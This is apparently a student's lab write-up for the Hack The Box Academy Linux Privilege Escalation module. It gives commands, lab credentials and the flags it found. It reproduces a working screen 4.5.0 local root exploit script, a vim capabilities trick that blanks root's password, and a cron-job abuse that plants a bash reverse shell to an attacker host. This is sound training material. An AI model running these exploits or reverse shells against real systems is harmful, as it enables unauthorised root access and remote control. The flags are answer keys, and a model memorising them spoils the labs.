---
title: CPTS labs - 24 Linux Privilege Escalation
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 24 Linux Privilege Escalation

Module: [Linux Privilege Escalation](https://academy.hackthebox.com/module/51)

### Information Gathering

SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!".
Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.

```
ssh htb@$ip
sudo -l
sudo -u lab_adm /bin/ncdu
# Escape to gain a shell with keyboard "b"

# After enumerating for a while
cd /home/labadm
cat .viminfo
# Note the file /usr/lib/int-check.sh within the .viminfo
cat /usr/lib/int-check.sh
```

Results: HTB{1nt3rn4l_5cr1p7_l34k}


**What is the latest Python version that is installed on the target?**

```
ls -la /etc/python* 
```

Results: 3.11


SSH to (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!". Find the WordPress database password.

```
ssh htb@$ip
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
# Note  /var/www/html/wp-config.php listed
cat  /var/www/html/wp-config.php
```

Results: W0rdpr3ss_sekur1ty!


### Environment-based Privilege Escalation

**SSH to (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!". Review the PATH of the htb-student user. What non-default directory is part of the user's PATH?**

```
echo $PATH
# Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/tmp
```

Results: /tmp


**SSH to  with user "htb-user" and password "HTB_@cademy_us3r!". Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer.**

```
# First, we locate the folder with the accepted binaries
echo $PATH

# Second, if ls is restricted, we can use echo `*`. For instance, for printing the files in current directory
echo *

# If the PATH was /home/user/bin, we can list the contents of PATH (the commands we can execute) with echo
echo /home/user/bin/*

# Also, if echo works, but not cat or some redirections characters, we can use that in out favor to read, for instance a file:
echo $(< flag.txt)
```

Results: HTB{35c4p3_7h3_r3stricted_5h311}


## Permissions-based Privilege Escalation


**SSH to (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!". Find a file with the setuid bit set that was not shown in the section command output (full path to the binary).**

```
# List binaries with setuid permissions
find / -perm /4000 2>/dev/null

# Note that /bin/sed did not appear on the section
```

Results: /bin/sed

**Find a file with the setgid bit set that was not shown in the section command output (full path to the binary).**

```
# List binaries with setgid permissions
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# Note that /usr/bin/facter did not appear on the section
```

Results: /usr/bin/facter


**What command can the htb-student user run as root?**

```
sudo -l
```

Results: /usr/bin/openssl


**Use the privileged group rights of the secaudit user to locate a flag.**

```
# Check privilege groups 
id

# Note the ADM permissions. With this we can read /var/log. Meaning that we can see logs from apache2. Let's see
cat /var/log/apache2/access.log

# Note the flag.
```

Results: ch3ck_th0se_gr0uP_m3mb3erSh1Ps!


**SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!". Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.**


```
# Enumerate binaries with capabilities:
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# Note in the list /usr/bin/vim.basic = cap_dac_override+eip
# We will modify the /etc/passwd
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd

# Now, when doing 
cat /etc/passwd | head -n1

# We will see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password: 
root::0:0:root:/root:/bin/bash

# Log as root
su root
cat /root/flag.txt
```

Results: HTB{c4paBili7i3s_pR1v35c}


## Service-based Privilege Escalation

**SSH to  (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!" Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory.**

```
# Connect via ssh
ssh htb-student@$ip

screen -version

nano screen_exploit.sh
```

Enter this content for the script:

```

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

Execute it

```
chmod +x screen_exploit.sh
./screen_exploit.sh
cat /root/screen_exploit/flag.txt
```

Results: 91927dad55ffd22825660da88f2f92e0


**SSH to  (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!" Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory.**

```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Output:

```
/etc/cron.daily/backup
/dmz-backups/backup.sh
```

A quick look in the /dmz-backups directory shows what appears to be files created every three minutes.  Since the script is world-writable, modify it to include a **reverse shell payload**.

```
echo '#!/bin/bash' > /dmz-backups/backup.sh
echo 'bash -i >& /dev/tcp/$IPAttacker/4444 0>&1' >> /dmz-backups/backup.sh
```

On your attack machine, start a Netcat listener to catch the shell:

```
nc -lnvp 4444
```

Wait for Cron to Execute the Script:

```
cat /root/cron_abuse/flag.txt
```

Results: 14347a2c977eb84508d3d50691a7ac4b

